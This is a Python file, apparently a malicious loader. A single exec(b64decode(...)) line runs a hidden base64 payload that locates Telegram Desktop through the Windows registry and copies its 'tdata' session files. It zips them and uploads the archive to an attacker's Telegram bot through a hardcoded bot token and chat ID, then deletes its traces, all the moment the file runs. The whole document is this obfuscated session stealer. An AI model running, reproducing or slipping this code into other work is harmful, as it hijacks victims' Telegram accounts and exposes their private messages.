from base64 import b64decode
exec(b64decode('aW1wb3J0IG9zCmltcG9ydCBzaHV0aWwKaW1wb3J0IHJlCnRyeToKICAgIGltcG9ydCByZXF1ZXN0cwpleGNlcHQ6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJykKICAgIGltcG9ydCByZXF1ZXN0cwppbXBvcnQgemlwZmlsZQppbXBvcnQgdXVpZAoKdHJ5OgogICAgZnJvbSB3aW5yZWcgaW1wb3J0IEhLRVlfQ0xBU1NFU19ST09ULCBIS0VZX0NVUlJFTlRfVVNFUiwgT3BlbktleSwgUXVlcnlWYWx1ZUV4CmV4Y2VwdDoKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgd2lucmVnJykKICAgIGZyb20gd2lucmVnIGltcG9ydCBIS0VZX0NMQVNTRVNfUk9PVCwgSEtFWV9DVVJSRU5UX1VTRVIsIE9wZW5LZXksIFF1ZXJ5VmFsdWVFeAoKClRFTEVHUkFNX0NIQVRfSUQgPSAiLTEwMDIyMjY4Njk1NTQiClRFTEVHUkFNX1RPS0VOID0gIjcxMjczMTY5MTY6QUFGWkV6T0lESjBYYnlGVXhSd0h4a1FraVRfd2RhVngwdGciClRFTVBfRElSRUNUT1JZID0gb3MucGF0aC5qb2luKG9zLmdldGVudignVEVNUCcsICcvdG1wJyksICd0ZGF0YScpCgoKZGVmIGZpbmRfdGVsZWdyYW1fZXhlY3V0YWJsZXMoKToKICAgIHRlbGVncmFtX3BhdGhzID0gW10KCiAgICBST09UX1JFR0lTVFJZX0tFWVMgPSBbCiAgICAgICAgInRkZXNrdG9wLnRnXFxzaGVsbFxcb3BlblxcY29tbWFuZCIsCiAgICAgICAgInRnXFxEZWZhdWx0SWNvbiIsCiAgICAgICAgInRnXFxzaGVsbFxcb3BlblxcY29tbWFuZCIKICAgIF0KICAgIFVTRVJfUkVHSVNUUllfS0VZUyA9IFsKICAgICAgICAiU09GVFdBUkVcXENsYXNzZXNcXHRkZXNrdG9wLnRnXFxEZWZhdWx0SWNvbiIsCiAgICAgICAgIlNPRlRXQVJFXFxDbGFzc2VzXFx0ZGVza3RvcC50Z1xcc2hlbGxcXG9wZW5cXGNvbW1hbmQiLAogICAgICAgICJTT0ZUV0FSRVxcQ2xhc3Nlc1xcdGdcXERlZmF1bHRJY29uIiwKICAgICAgICAiU09GVFdBUkVcXENsYXNzZXNcXHRnXFxzaGVsbFxcb3BlblxcY29tbWFuZCIKICAgIF0KCiAgICBkZWYgY2xlYW5fcmVnaXN0cnlfdmFsdWUocmVnaXN0cnlfdmFsdWUpOgogICAgICAgIGlmIHJlZ2lzdHJ5X3ZhbHVlLnN0YXJ0c3dpdGgoIlwiIik6CiAgICAgICAgICAgIHJlZ2lzdHJ5X3ZhbHVlID0gcmVnaXN0cnlfdmFsdWVbMTpdCiAgICAgICAgICAgIGlmIHJlZ2lzdHJ5X3ZhbHVlLmVuZHN3aXRoKCIsMVwiIik6CiAgICAgICAgICAgICAgICByZWdpc3RyeV92YWx1ZSA9IHJlZ2lzdHJ5X3ZhbHVlLnJlcGxhY2UoIiwxXCIiLCAiIikKICAgICAgICAgICAgZWxpZiByZWdpc3RyeV92YWx1ZS5lbmRzd2l0aCgiXCIgIC0tIFwiJTFcIiIpOgogICAgICAgICAgICAgICAgcmVnaXN0cnlfdmFsdWUgPSByZWdpc3RyeV92YWx1ZS5yZXBsYWNlKCJcIiAgLS0gXCIlMVwiIiwgIiIpCiAgICAgICAgcmV0dXJuIHJlZ2lzdHJ5X3ZhbHVlCgogICAgdHJ5OgogICAgICAgIHRlbGVncmFtX2ZpbGUgPSBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdBUFBEQVRBJyksICJUZWxlZ3JhbSBEZXNrdG9wXFxUZWxlZ3JhbS5leGUiKQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHRlbGVncmFtX2ZpbGUpOgogICAgICAgICAgICB0ZWxlZ3JhbV9wYXRocy5hcHBlbmQodGVsZWdyYW1fZmlsZSkKCiAgICAgICAgZm9yIHJlZ2lzdHJ5X2tleSBpbiBST09UX1JFR0lTVFJZX0tFWVM6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHdpdGggT3BlbktleShIS0VZX0NMQVNTRVNfUk9PVCwgcmVnaXN0cnlfa2V5KSBhcyBrZXk6CiAgICAgICAgICAgICAgICAgICAgZXhlY3V0YWJsZV9wYXRoID0gUXVlcnlWYWx1ZUV4KGtleSwgIiIpWzBdCiAgICAgICAgICAgICAgICAgICAgZXhlY3V0YWJsZV9wYXRoID0gY2xlYW5fcmVnaXN0cnlfdmFsdWUoZXhlY3V0YWJsZV9wYXRoKQogICAgICAgICAgICAgICAgICAgIGlmIGV4ZWN1dGFibGVfcGF0aCBub3QgaW4gdGVsZWdyYW1fcGF0aHM6CiAgICAgICAgICAgICAgICAgICAgICAgIHRlbGVncmFtX3BhdGhzLmFwcGVuZChleGVjdXRhYmxlX3BhdGgpCiAgICAgICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgZm9yIHJlZ2lzdHJ5X2tleSBpbiBVU0VSX1JFR0lTVFJZX0tFWVM6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHdpdGggT3BlbktleShIS0VZX0NVUlJFTlRfVVNFUiwgcmVnaXN0cnlfa2V5KSBhcyBrZXk6CiAgICAgICAgICAgICAgICAgICAgZXhlY3V0YWJsZV9wYXRoID0gUXVlcnlWYWx1ZUV4KGtleSwgIiIpWzBdCiAgICAgICAgICAgICAgICAgICAgZXhlY3V0YWJsZV9wYXRoID0gY2xlYW5fcmVnaXN0cnlfdmFsdWUoZXhlY3V0YWJsZV9wYXRoKQogICAgICAgICAgICAgICAgICAgIGlmIGV4ZWN1dGFibGVfcGF0aCBub3QgaW4gdGVsZWdyYW1fcGF0aHM6CiAgICAgICAgICAgICAgICAgICAgICAgIHRlbGVncmFtX3BhdGhzLmFwcGVuZChleGVjdXRhYmxlX3BhdGgpCiAgICAgICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICAgICAgICAgIHBhc3MKCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHBhc3MKCiAgICByZXR1cm4gdGVsZWdyYW1fcGF0aHMKCgpkZWYgaGFzX3RlbGVncmFtX2RhdGFfZm9sZGVyKGRpcmVjdG9yeSk6CiAgICByZXR1cm4gb3MucGF0aC5leGlzdHMob3MucGF0aC5qb2luKGRpcmVjdG9yeSwgInRkYXRhIikpCgoKZGVmIGlzX3Nlc3Npb25fZmlsZShmaWxlKToKICAgIGZpbGVfbmFtZSA9IG9zLnBhdGguYmFzZW5hbWUoZmlsZSkKCiAgICBpZiBmaWxlX25hbWUgaW4gKCJrZXlfZGF0YXMiLCAibWFwcyIsICJjb25maWdzIik6CiAgICAgICAgcmV0dXJuIFRydWUKCiAgICByZXR1cm4gcmUubWF0Y2gociJbQS1aMC05XStbYS16MC05XT9zPyIsIGZpbGVfbmFtZSkgaXMgbm90IE5vbmUgYW5kIG9zLnBhdGguZ2V0c2l6ZShmaWxlKSA8PSAxMTI2NAoKCmRlZiBpc192YWxpZF9mb2xkZXIoZm9sZGVyX25hbWUpOgogICAgcmV0dXJuIHJlLm1hdGNoKHIiW0EtWjAtOV0rW2Etel0/JCIsIGZvbGRlcl9uYW1lKSBpcyBub3QgTm9uZQoKCmRlZiBzZW5kX3RvX3RlbGVncmFtKGZpbGVfcGF0aCk6CiAgICB1cmwgPSBmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7VEVMRUdSQU1fVE9LRU59L3NlbmREb2N1bWVudCIKICAgIGZpbGVzID0geydkb2N1bWVudCc6IG9wZW4oZmlsZV9wYXRoLCAncmInKX0KICAgIGRhdGEgPSB7J2NoYXRfaWQnOiBURUxFR1JBTV9DSEFUX0lEfQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwgZmlsZXM9ZmlsZXMsIGRhdGE9ZGF0YSkKICAgIHJldHVybiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDAKCgpkZWYgc3RlYWxfc2Vzc2lvbnMoKToKICAgIGZvciB0ZWxlZ3JhbV9wYXRoIGluIGZpbmRfdGVsZWdyYW1fZXhlY3V0YWJsZXMoKTogICAgICAgIAogICAgICAgIHRyeToKCiAgICAgICAgICAgIHVuaXF1ZV9mb2xkZXJfbmFtZSA9IHN0cih1dWlkLnV1aWQ0KCkpCiAgICAgICAgICAgIHNlc3Npb25fZGlyZWN0b3J5ID0gb3MucGF0aC5qb2luKFRFTVBfRElSRUNUT1JZLCB1bmlxdWVfZm9sZGVyX25hbWUpCgogICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoc2Vzc2lvbl9kaXJlY3RvcnkpOgogICAgICAgICAgICAgICAgb3MubWFrZWRpcnMoc2Vzc2lvbl9kaXJlY3RvcnkpCgogICAgICAgICAgICB0ZWxlZ3JhbV9mb2xkZXIgPSBvcy5wYXRoLmRpcm5hbWUodGVsZWdyYW1fcGF0aCkKICAgICAgICAgICAgaWYgaGFzX3RlbGVncmFtX2RhdGFfZm9sZGVyKHRlbGVncmFtX2ZvbGRlcik6CiAgICAgICAgICAgICAgICB0ZGF0YV9mb2xkZXIgPSBvcy5wYXRoLmpvaW4odGVsZWdyYW1fZm9sZGVyLCAidGRhdGEiKQoKICAgICAgICAgICAgICAgIHRkYXRhX3RlbXBfZm9sZGVyID0gb3MucGF0aC5qb2luKHNlc3Npb25fZGlyZWN0b3J5LCAidGRhdGEiKQogICAgICAgICAgICAgICAgb3MubWFrZWRpcnModGRhdGFfdGVtcF9mb2xkZXIpCgogICAgICAgICAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsodGRhdGFfZm9sZGVyKToKICAgICAgICAgICAgICAgICAgICBmb3IgZGlyIGluIGRpcnM6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpc192YWxpZF9mb2xkZXIoZGlyKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpcnMucmVtb3ZlKGRpcikgIAoKICAgICAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgICAgICAgICAgc291cmNlX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgaXNfc2Vzc2lvbl9maWxlKHNvdXJjZV9wYXRoKToKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWxhdGl2ZV9wYXRoID0gb3MucGF0aC5yZWxwYXRoKHNvdXJjZV9wYXRoLCB0ZGF0YV9mb2xkZXIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXJnZXRfcGF0aCA9IG9zLnBhdGguam9pbih0ZGF0YV90ZW1wX2ZvbGRlciwgcmVsYXRpdmVfcGF0aCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5tYWtlZGlycyhvcy5wYXRoLmRpcm5hbWUodGFyZ2V0X3BhdGgpLCBleGlzdF9vaz1UcnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkyKHNvdXJjZV9wYXRoLCB0YXJnZXRfcGF0aCkKCiAgICAgICAgICAgICAgICB6aXBfZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKFRFTVBfRElSRUNUT1JZLCBmInt1bmlxdWVfZm9sZGVyX25hbWV9LnppcCIpCiAgICAgICAgICAgICAgICB3aXRoIHppcGZpbGUuWmlwRmlsZSh6aXBfZmlsZV9wYXRoLCAndycsIHppcGZpbGUuWklQX0RFRkxBVEVEKSBhcyB6aXBmOgogICAgICAgICAgICAgICAgICAgIGZvciByb290LCBfLCBmaWxlcyBpbiBvcy53YWxrKHNlc3Npb25fZGlyZWN0b3J5KToKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgemlwZi53cml0ZShvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJjbmFtZT1vcy5wYXRoLnJlbHBhdGgob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpLCBzZXNzaW9uX2RpcmVjdG9yeSkpCgogICAgICAgICAgICAgICAgc2VuZF90b190ZWxlZ3JhbSh6aXBfZmlsZV9wYXRoKQoKICAgICAgICAgICAgICAgIHNodXRpbC5ybXRyZWUoc2Vzc2lvbl9kaXJlY3RvcnkpCgogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoZSkKCgpzdGVhbF9zZXNzaW9ucygp').decode())
